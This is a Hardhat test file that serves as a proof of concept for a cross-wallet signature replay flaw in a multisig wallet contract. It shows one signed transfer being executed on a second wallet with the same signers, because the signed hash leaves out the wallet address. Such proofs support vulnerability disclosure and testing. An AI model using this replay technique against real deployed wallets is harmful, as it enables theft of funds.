const { expect } = require('chai');
const { ethers } = require('hardhat');
const helpers = require('./helpers');
const util = require('ethereumjs-util');

describe('Cross-Wallet Replay Vulnerability PoC', function () {
  let WalletSimple, WalletFactory;
  let deployer, signer1, signer2, user1;
  let walletA, walletB;

  before(async () => {
    [deployer, signer1, signer2, user1] = await ethers.getSigners();
    WalletSimple = await ethers.getContractFactory('WalletSimple');
    WalletFactory = await ethers.getContractFactory('WalletFactory');

    const walletImplementation = await WalletSimple.deploy();
    await walletImplementation.waitForDeployment();
    const walletFactory = await WalletFactory.deploy(await walletImplementation.getAddress());
    await walletFactory.waitForDeployment();

    // Create Wallet A with signers [deployer, signer1, signer2]
    const signers = [deployer.address, signer1.address, signer2.address];
    const txA = await walletFactory.createWallet(signers, ethers.ZeroHash);
    const receiptA = await txA.wait();
    const eventA = receiptA.logs.find(log => {
        try { return walletFactory.interface.parseLog(log).name === 'WalletCreated' } catch(e) { return false }
    });
    walletA = await ethers.getContractAt('WalletSimple', walletFactory.interface.parseLog(eventA).args.newWalletAddress);

    // Create Wallet B with same signers [deployer, signer1, signer2]
    // Different salt -> different address
    const saltB = ethers.id("different salt");
    const txB = await walletFactory.createWallet(signers, saltB);
    const receiptB = await txB.wait();
    const eventB = receiptB.logs.find(log => {
        try { return walletFactory.interface.parseLog(log).name === 'WalletCreated' } catch(e) { return false }
    });
    walletB = await ethers.getContractAt('WalletSimple', walletFactory.interface.parseLog(eventB).args.newWalletAddress);

    // Fund both wallets
    await deployer.sendTransaction({ to: await walletA.getAddress(), value: ethers.parseEther('10') });
    await deployer.sendTransaction({ to: await walletB.getAddress(), value: ethers.parseEther('10') });
  });

  it('VULNERABILITY: Cross-Wallet Signature Replay', async function () {
    const amount = ethers.parseEther('1');
    const data = '0x';
    const expireTime = Math.floor(Date.now() / 1000) + 3600;
    const sequenceId = 1;
    const { chainId } = await ethers.provider.getNetwork();
    const prefix = chainId.toString();

    console.log(`Wallet A address: ${await walletA.getAddress()}`);
    console.log(`Wallet B address: ${await walletB.getAddress()}`);

    // Sign a transaction for Wallet A using signer1.
    // Note: The hashing logic in the contract is keccak256(abi.encode(prefix, toAddress, value, data, expireTime, sequenceId))
    // It DOES NOT include address(this).
    const operationHash = helpers.getSha3ForConfirmationTx(
      prefix,
      user1.address,
      amount.toString(),
      data,
      expireTime,
      sequenceId
    );

    const sig = util.ecsign(
      Buffer.from(operationHash.slice(2), 'hex'),
      helpers.privateKeyForAccount(signer1.address)
    );
    const signature = helpers.serializeSignature(sig);

    // 1. Execute on Wallet A (legitimate)
    console.log('Executing transaction on Wallet A...');
    await walletA.connect(deployer).sendMultiSig(
      user1.address,
      amount,
      data,
      expireTime,
      sequenceId,
      signature
    );
    expect(await ethers.provider.getBalance(await walletA.getAddress())).to.equal(ethers.parseEther('9'));
    console.log('Transaction on Wallet A successful.');

    // 2. Replay same signature on Wallet B
    // Since Wallet B has the same signers and the hash didn't include the wallet address,
    // the signature is valid for Wallet B too.
    console.log('Attempting to replay the same signature on Wallet B...');
    await walletB.connect(deployer).sendMultiSig(
      user1.address,
      amount,
      data,
      expireTime,
      sequenceId,
      signature
    );
    expect(await ethers.provider.getBalance(await walletB.getAddress())).to.equal(ethers.parseEther('9'));
    console.log('VULNERABILITY CONFIRMED: Signature replayed successfully on Wallet B!');
  });
});
